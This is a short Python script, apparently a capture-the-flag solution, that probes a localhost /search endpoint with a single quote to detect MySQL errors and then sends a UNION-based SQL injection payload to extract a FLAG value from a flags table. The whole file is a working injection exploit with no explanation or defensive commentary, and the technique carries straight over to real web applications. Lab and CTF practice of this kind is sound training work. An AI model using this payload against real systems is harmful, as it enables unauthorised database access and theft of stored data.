#!/usr/bin/env python3
import requests
import re

TARGET = "http://localhost:5005"

def main():
    # Trigger error
    r = requests.get(f"{TARGET}/search", params={"q": "'"})
    
    if "SQL syntax" in r.text:
        print("[+] MySQL detected!")
    
    # Extract flag
    payload = "' UNION SELECT 1,flag_value,3,4,5 FROM flags-- "
    r = requests.get(f"{TARGET}/search", params={"q": payload})
    
    flag = re.search(r'FLAG\{[^}]+\}', r.text)
    if flag:
        print(f"[+] Flag: {flag.group(0)}")

if __name__ == "__main__":
    main()
